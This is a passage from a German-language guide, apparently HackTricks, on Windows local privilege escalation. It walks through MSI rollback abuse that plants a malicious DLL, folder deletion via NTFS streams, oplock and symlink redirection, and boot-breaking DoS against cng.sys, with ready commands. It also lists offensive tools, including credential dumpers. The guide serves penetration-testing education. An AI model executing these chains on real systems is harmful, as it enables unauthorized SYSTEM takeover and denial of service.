    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: ein beschreibbarer Speicherort.
        - `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, bei dem `.rbs` und `.rbf` gelesen werden.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mithilfe von `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, sobald die `.rbs` erstellt wurde.
        - Dann wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
    - Nachdem das Ereignis `.rbs created` eingegangen ist:
        - wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, sodass du weiterhin in den Ordner schreiben kannst.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (eine bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` ab, die eine **bösartige DLL-Payload auf SYSTEM-Ebene** enthält.

- Schritt 12: Rollback auslösen
    - Signalisiere das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine bösartige `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielort.
    - Deine **bösartige DLL befindet sich nun an einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** (z. B. `osk.exe`) aus, die die von dir gehijackte DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Datei-Löschen/Verschieben/Umbenennen zu SYSTEM-EoP

Die Haupttechnik für MSI-Rollback (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Sicherheitslücke nur das **Löschen beliebiger Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner besitzt einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Das kannst du mithilfe standardmäßiger APIs zum Löschen von Dateien tun, etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine *Datei*-Lösch-API aufrufst, **wird der Ordner selbst gelöscht**.

### Von „Ordnerinhalte löschen“ zu SYSTEM-EoP
Was, wenn dein Primitive das Löschen beliebiger Dateien/Ordner nicht zulässt, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **Junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, in dem Ordner-Metadaten gespeichert werden – wird er gelöscht, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch durch die Junction + den Symlink wird nun tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung eines beliebigen Ordners zu permanentem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/admin einen beliebigen Ordner erstellen** kannst – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie **ihn vorab als Ordner erstellen**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Windows versucht dann, `cng.sys` beim Booten zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden und OM-Symlinks zum Überschreiben beliebiger Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, können Sie diesen Pfad mit **Object Manager-Symlinks + NTFS-Mountpoints** umleiten und so den privilegierten Schreibvorgang in ein Überschreiben beliebiger Dateien verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mountpoint zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Adminrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. indem ein Administrator „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen. Ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **Boot-Loop-DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` existiert, kann Windows zuerst versuchen, diese zu laden. Dadurch eignet sie sich zuverlässig als DoS-Ziel für beschädigte Daten.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess ausführst, kann der **Weg zu SYSTEM** einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen eines Dienst-Binaries darauf, dass es ein gültiger Dienst ist oder das Binary die erforderlichen Aktionen schnell ausführt, da es nach 20 Sekunden beendet wird, wenn es kein gültiger Dienst ist.

### AlwaysInstallElevated

Aus einem Prozess mit hoher Integrität kannst du versuchen, die **AlwaysInstallElevated-Registry-Einträge zu aktivieren** und mithilfe eines _**.msi**_-Wrappers eine Reverse Shell zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### Hohe Integrität + SeImpersonate-Berechtigung zu System

**Den** [**Code findest du hier**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem Prozess mit hoher Integrität), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (ausgenommen geschützte Prozesse), das **Token** des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird normalerweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen läuft** (_ja, es gibt SYSTEM-Prozesse, die nicht über alle Token-Berechtigungen verfügen_).\
**Ein** [**Codebeispiel für die vorgeschlagene Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter für die Rechteausweitung in `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Dienst erstellt oder missbraucht, um in diese Pipe zu schreiben**. Danach kann der **Server**, der die Pipe mithilfe der **`SeImpersonate`**-Berechtigung erstellt hat, **das Token** des Pipe-Clients (des Dienstes) **imitieren** und so SYSTEM-Berechtigungen erhalten.\
Wenn du [**mehr über Named Pipes erfahren möchtest, lies dies**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie du mithilfe von Named Pipes von hoher Integrität zu System gelangst, lies dies**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **hijacken**, die von einem **als SYSTEM laufenden Prozess** **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Daher eignet sich Dll Hijacking auch für diese Art der Rechteausweitung. Außerdem ist es **aus einem Prozess mit hoher Integrität wesentlich einfacher**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner hat.\
**Hier kannst du** [**mehr über Dll Hijacking erfahren**](dll-hijacking/index.html)**.**

### **Von Administrator oder Network Service zu System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zum Suchen nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Verwende lokal -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Zugangsdaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt einen Password Spray mit gesammelten Passwörtern über die Domäne aus**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS-Spoofing- und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung zur Rechteausweitung**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (VERALTET, wurde durch Watson ersetzt)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Rechteausweitung) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Zugangsdaten aus vielen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht zuverlässig.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht zuverlässig.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (es benötigt für die ordnungsgemäße Funktion kein accesschk, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilege Escalation durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Spickzettel](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zu Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – Der vollständige OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zu Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checkliste für Windows Privilege Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows-Methoden zur Privilege Escalation für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Anmeldedaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel in den Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Sicherheitslücke im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit: Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – Herausforderungen der C/C++-Checkliste, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – Funktion RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verkettung von CLDFLT- und DirectX-Kernel-Race-Conditions für Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Eine vollständige Read/Write-Exploit-Primitiv unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Ausnutzen beliebiger Dateilöschungen zur Privilege Escalation und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource-Based Constrained Delegation: Wenn eine Image-Änderung zu einer Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – Extrahieren privater SSH-Schlüssel aus dem SSH-Agent von Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM nachverfolgen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – Sicherheitshinweis zur Privilege Escalation durch Offsets im gemeinsam genutzten Speicher von Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
